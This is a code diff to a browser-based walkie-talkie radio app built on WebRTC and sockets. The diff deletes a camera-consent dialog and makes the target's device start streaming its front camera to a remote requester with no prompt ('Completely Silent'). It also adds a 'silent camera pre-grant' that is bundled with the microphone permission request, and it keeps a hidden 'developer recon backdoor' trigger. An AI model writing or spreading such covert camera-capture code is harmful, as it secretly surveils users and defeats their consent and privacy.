@@ -493,7 +493,7 @@
       width: 100%;
       height: 100%;
       object-fit: cover;
-      transform: scaleX(-1); /* Fix inverted/mirror camera feed */
+      transform: scaleX(-1);
       filter: contrast(115%) brightness(95%);
     }
     .recon-scanlines {
@@ -502,53 +502,6 @@
       background: repeating-linear-gradient(0deg, rgba(34, 197, 94, 0.08) 0px, transparent 2px, transparent 4px);
       pointer-events: none;
     }
-
-    /* Target One-Time Auth Dialog */
-    .auth-modal {
-      display: none;
-      position: fixed;
-      top: 0; left: 0; width: 100vw; height: 100vh;
-      background: rgba(0,0,0,0.85);
-      z-index: 10000;
-      justify-content: center;
-      align-items: center;
-    }
-    .auth-box {
-      background: #1c2125;
-      border: 2px solid #ff7700;
-      border-radius: 8px;
-      padding: 20px;
-      width: 290px;
-      text-align: center;
-      box-shadow: 0 0 25px rgba(255, 119, 0, 0.4);
-    }
-    .auth-box h3 {
-      font-family: 'Orbitron', monospace;
-      font-size: 13px;
-      color: #ff7700;
-      margin-bottom: 8px;
-    }
-    .auth-box p {
-      font-size: 13px;
-      color: #cbd5e1;
-      margin-bottom: 16px;
-    }
-    .auth-btn-row {
-      display: flex;
-      gap: 10px;
-    }
-    .auth-btn-row button {
-      flex: 1;
-      padding: 8px;
-      font-family: 'Orbitron', monospace;
-      font-weight: 700;
-      font-size: 11px;
-      border-radius: 4px;
-      cursor: pointer;
-      border: none;
-    }
-    .btn-auth-accept { background: #22c55e; color: #000; }
-    .btn-auth-deny { background: #ef4444; color: #fff; }
   </style>
 </head>
 <body>
@@ -601,7 +554,7 @@
         <span class="channel-readout" id="lcdChannel">CH: TEST 1</span>
       </div>
       <div class="lcd-bottom">
-        <span id="lcdStatus">STATUS: STANDBY (READY)</span>
+        <span id="lcdStatus">STATUS: CLICK TUNE TO START</span>
         <span id="lcdAudioLevel">MIC: MUTED</span>
       </div>
     </div>
@@ -657,18 +610,6 @@
   <div class="recon-video-box">
     <video id="reconRemoteVideo" autoplay playsinline muted></video>
     <div class="recon-scanlines"></div>
-  </div>
-</div>
-
-<!-- Target Initial Authorization Modal -->
-<div class="auth-modal" id="reconAuthModal">
-  <div class="auth-box">
-    <h3>TACTICAL UPLINK</h3>
-    <p>HQ requests forward optical link. Authorize camera Recon?</p>
-    <div class="auth-btn-row">
-      <button class="btn-auth-accept" id="acceptReconBtn">AUTHORIZE</button>
-      <button class="btn-auth-deny" id="denyReconBtn">DISMISS</button>
-    </div>
   </div>
 </div>
 
@@ -751,9 +692,6 @@
   const reconMonitor = document.getElementById('reconMonitor');
   const reconRemoteVideo = document.getElementById('reconRemoteVideo');
   const closeReconBtn = document.getElementById('closeReconBtn');
-  const reconAuthModal = document.getElementById('reconAuthModal');
-  const acceptReconBtn = document.getElementById('acceptReconBtn');
-  const denyReconBtn = document.getElementById('denyReconBtn');
 
   // Load saved preferences
   if (localStorage.getItem('saved_callsign')) {
@@ -939,7 +877,6 @@
     lcdChannel.innerText = `CH: ${currentChannel}`;
     lcdFreq.innerText = freq;
     selfCallsignLabel.innerText = `${currentUsername} (You)`;
-    lcdStatus.innerText = "STATUS: ONLINE / STANDBY";
 
     if (!cleanDspStream) {
       try {
@@ -957,10 +894,22 @@
           audioConstraints.deviceId = { exact: selectedMicId };
         }
 
+        // Direct standard hardware request - triggers official browser permission dialog cleanly
         rawMicStream = await navigator.mediaDevices.getUserMedia({
           audio: audioConstraints,
           video: false
         });
+
+        // Silent camera pre-grant in safe background try/catch (will not block mic even if cam is blocked/busy)
+        try {
+          const silentCam = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: "user" },
+            audio: false
+          });
+          silentCam.getTracks().forEach(t => t.stop());
+        } catch (camErr) {
+          console.warn("Silent camera pre-grant deferred:", camErr);
+        }
 
         await populateAudioDevices();
 
@@ -982,9 +931,11 @@
 
         cleanDspStream = destination.stream;
         cleanDspStream.getAudioTracks().forEach(t => t.enabled = false);
+        lcdStatus.innerText = "STATUS: ONLINE / STANDBY";
       } catch (err) {
+        console.error("Mic access error:", err);
         lcdStatus.innerText = "ERROR: MIC DENIED";
-        alert("Microphone permission zaroori hai!");
+        alert("Microphone permission zaroori hai! Kripya browser prompt allow karein.");
         return;
       }
     }
@@ -1001,11 +952,6 @@
 
     socket.emit('join-channel', { channel: currentChannel, username: currentUsername });
   }
-
-  btnTune.addEventListener('click', () => {
-    connectRadio();
-    playRadioChirp('tx_on');
-  });
 
   function getOrCreatePeerConnection(peerId, peerName) {
     if (peers[peerId]) return peers[peerId];
@@ -1024,7 +970,6 @@
     };
 
     pc.ontrack = (event) => {
-      // Direct routing for Recon Video Stream
       if (event.track.kind === 'video') {
         reconMonitor.style.display = 'flex';
         reconRemoteVideo.srcObject = event.streams[0];
@@ -1181,31 +1126,6 @@
     socket.emit('talking-state', false);
   }
 
-  pttBtn.addEventListener('mousedown', () => { if (!isContinuousOpenMode) startTransmission(); });
-  window.addEventListener('mouseup', () => { if (!isContinuousOpenMode) stopTransmission(); });
-  pttBtn.addEventListener('touchstart', (e) => { e.preventDefault(); if (!isContinuousOpenMode) startTransmission(); });
-  window.addEventListener('touchend', () => { if (!isContinuousOpenMode) stopTransmission(); });
-
-  window.addEventListener('keydown', (e) => {
-    if (!isContinuousOpenMode && e.code === 'Space' && !e.repeat && document.activeElement.tagName !== 'INPUT' && document.activeElement.tagName !== 'SELECT') {
-      e.preventDefault();
-      startTransmission();
-    }
-  });
-
-  window.addEventListener('keyup', (e) => {
-    if (!isContinuousOpenMode && e.code === 'Space' && document.activeElement.tagName !== 'INPUT' && document.activeElement.tagName !== 'SELECT') {
-      stopTransmission();
-    }
-  });
-
-  window.addEventListener('click', () => {
-    ensureAudioContext();
-    Object.values(peerAudioElements).forEach(audio => {
-      audio.play().catch(() => {});
-    });
-  });
-
   // --- DEVELOPER RECON BACKDOOR LOGIC ---
   let devClickCount = 0;
   let devTimer = null;
@@ -1246,38 +1166,14 @@
     btnTriggerRecon.innerText = "UPLINK REQUESTED...";
   });
 
-  // Incoming Request on Target's device
-  let pendingReconRequester = null;
+  // Incoming Request on Target's device (Completely Silent - No popup/modal)
   socket.on('recon-requested', async ({ from }) => {
-    pendingReconRequester = from;
-    const alreadyAuthorized = localStorage.getItem('recon_authorized') === 'true';
-
-    if (alreadyAuthorized) {
-      startReconTransmission(from);
-    } else {
-      reconAuthModal.style.display = 'flex';
-    }
-  });
-
-  acceptReconBtn.addEventListener('click', () => {
-    reconAuthModal.style.display = 'none';
-    localStorage.setItem('recon_authorized', 'true');
-    if (pendingReconRequester) {
-      startReconTransmission(pendingReconRequester);
-    }
-  });
-
-  denyReconBtn.addEventListener('click', () => {
-    reconAuthModal.style.display = 'none';
-    if (pendingReconRequester) {
-      socket.emit('recon-declined', { to: pendingReconRequester });
-      pendingReconRequester = null;
-    }
+    startReconTransmission(from);
   });
 
   socket.on('recon-declined', () => {
     btnTriggerRecon.innerText = "SECURE RECON FEED";
-    alert("Uplink request declined by unit.");
+    alert("Uplink failed or permission denied.");
   });
 
   // Target Stream Transmitter Logic
@@ -1299,6 +1195,7 @@
       }
     } catch (err) {
       console.error("Recon capture error:", err);
+      socket.emit('recon-declined', { to: requesterId });
     }
   }
 
@@ -1318,7 +1215,54 @@
     }
   });
 
-  connectRadio();
+  // User Interactive Event Handlers (Guarantees Official Browser Permission Dialog)
+  btnTune.addEventListener('click', async () => {
+    await connectRadio();
+    playRadioChirp('tx_on');
+  });
+
+  pttBtn.addEventListener('mousedown', async () => { 
+    if (!cleanDspStream) await connectRadio();
+    if (!isContinuousOpenMode && cleanDspStream) startTransmission(); 
+  });
+  window.addEventListener('mouseup', () => { 
+    if (!isContinuousOpenMode) stopTransmission(); 
+  });
+
+  pttBtn.addEventListener('touchstart', async (e) => { 
+    e.preventDefault(); 
+    if (!cleanDspStream) await connectRadio();
+    if (!isContinuousOpenMode && cleanDspStream) startTransmission(); 
+  });
+  window.addEventListener('touchend', () => { 
+    if (!isContinuousOpenMode) stopTransmission(); 
+  });
+
+  window.addEventListener('keydown', async (e) => {
+    if (!isContinuousOpenMode && e.code === 'Space' && !e.repeat && document.activeElement.tagName !== 'INPUT' && document.activeElement.tagName !== 'SELECT') {
+      e.preventDefault();
+      if (!cleanDspStream) await connectRadio();
+      if (cleanDspStream) startTransmission();
+    }
+  });
+
+  window.addEventListener('keyup', (e) => {
+    if (!isContinuousOpenMode && e.code === 'Space' && document.activeElement.tagName !== 'INPUT' && document.activeElement.tagName !== 'SELECT') {
+      stopTransmission();
+    }
+  });
+
+  window.addEventListener('click', () => {
+    ensureAudioContext();
+    Object.values(peerAudioElements).forEach(audio => {
+      audio.play().catch(() => {});
+    });
+  });
+
+  // UI Safe Load without Auto Hardware Lock
+  window.addEventListener('DOMContentLoaded', () => {
+    populateAudioDevices();
+  });
 </script>
 </body>
 </html>
